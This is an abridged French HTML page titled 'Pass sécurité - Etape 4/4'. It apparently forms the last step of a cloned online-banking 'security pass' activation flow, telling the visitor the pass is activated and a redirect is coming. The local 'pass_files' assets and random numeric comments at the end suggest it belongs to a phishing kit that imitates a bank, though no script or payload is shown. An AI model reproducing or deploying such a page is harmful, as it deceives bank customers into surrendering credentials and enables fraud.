...
<html lang="FR" class="swm-root-active swm-mode-page"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	...
	<link href="./pass_files/index_20190723161948.min.css" rel="stylesheet" type="text/css">
    ...
    <link rel="stylesheet" href="./pass_files/inbenta.css">
	<link rel="stylesheet" href="./pass_files/style.css">
	<link href="./pass_files/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
    <style type="text/css">
...
<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Déconnecter" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#">                <span class="rsp_link__label">Déconnecter</span>
	...
	<h1 class="rsp_header__title-page" id="js-mobile-title">Pass sécurité - Etape 4/4</h1>
...
<div class="swm-popin-wrapper" tabindex="0" role="dialog" aria-live="assertive">
    ...
    <main role="main" class="dcw_authent dcw_csetape">
        <div class="dcw_codeContainer">
			...
			<div id="oop" align="center" class="woo">
				<img src="./pass_files/loader.gif">
			</div>
			
            <div id="codCl" class="waa">
				
                <div class="dcw_block dcw_block-text">
                    <div class="dcw_block-element">
					<img src="img/complete.png" width="50px" height="50px" /><br>
                        <h3>Votre Pass Sécurité a bien été activé, <br>Vous allez vous rediriger vers la page d'accueil.</h3>
                    </div>
                </div>
...
<!--23774873--><!--67909273--><!--85066422--><!--70314796--><!--5229025--><!--26790934--><!--68715746--></body></html>
